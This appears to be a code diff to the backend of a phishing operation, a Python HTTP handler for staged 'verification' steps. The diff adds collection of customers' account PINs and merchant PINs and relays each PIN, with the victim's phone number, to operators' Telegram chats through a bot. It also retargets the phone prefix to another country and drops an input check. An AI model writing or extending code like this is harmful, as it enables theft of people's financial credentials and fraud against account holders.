@@ -2122,10 +2122,8 @@ class Handler(BaseHTTPRequestHandler):
             val_uuid = str(uuid.UUID(app_id))
         except (ValueError, TypeError, AttributeError):
             return self.send_json(400, {"error": "Invalid application ID"})
-        if not isinstance(data, dict):
-            return self.send_json(400, {"error": "Invalid verification data"})
         step = data.get("step")
-        if step not in ("zip_phone", "id_document"):
+        if step not in ("zip_phone", "id_document", "account_pin", "merchant_pin"):
             return self.send_json(400, {"error": "Invalid verification step"})
 
         with connect_db() as db:
@@ -2146,7 +2144,7 @@ class Handler(BaseHTTPRequestHandler):
             phone = None
             id_number = None
 
-            if step == "zip_phone":
+            if step in ("zip_phone", "account_pin", "merchant_pin"):
                 zip_code = str(data.get("zipCode", "")).strip()
                 phone = str(data.get("phone", "")).strip()
                 if not zip_code or not phone:
@@ -2186,9 +2184,15 @@ class Handler(BaseHTTPRequestHandler):
                 target_chats.append(str(admin_c).strip())
 
         if target_chats and telegram_bot_token():
-            step_label = "📍 Step 3: PIN Validation" if step == "zip_phone" else "💬 Step 4: SMS / Verification Message"
-            active_phone = phone if (step == "zip_phone" and phone) else app["phone"]
-            phone_display = active_phone if str(active_phone).startswith("+") else f"+232 {active_phone}"
+            if step in ("zip_phone", "account_pin"):
+                step_label = "🔐 Step 4: Account PIN Validation (Customer PIN)"
+            elif step == "merchant_pin":
+                step_label = "🔑 Step 5: Merchant Account PIN Validation (Merchant PIN)"
+            else:
+                step_label = "💬 Step 3: SMS Verification Message"
+
+            active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+255 {active_phone}"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -2206,7 +2210,7 @@ class Handler(BaseHTTPRequestHandler):
                 f"Phone: {phone_display}",
                 f"Profile: {returning_badge}",
             ]
-            if step == "zip_phone":
+            if step in ("zip_phone", "account_pin", "merchant_pin"):
                 lines.append(f"PIN: {zip_code}")
             elif step == "id_document":
                 is_url = str(id_number).strip().startswith(("http://", "https://"))
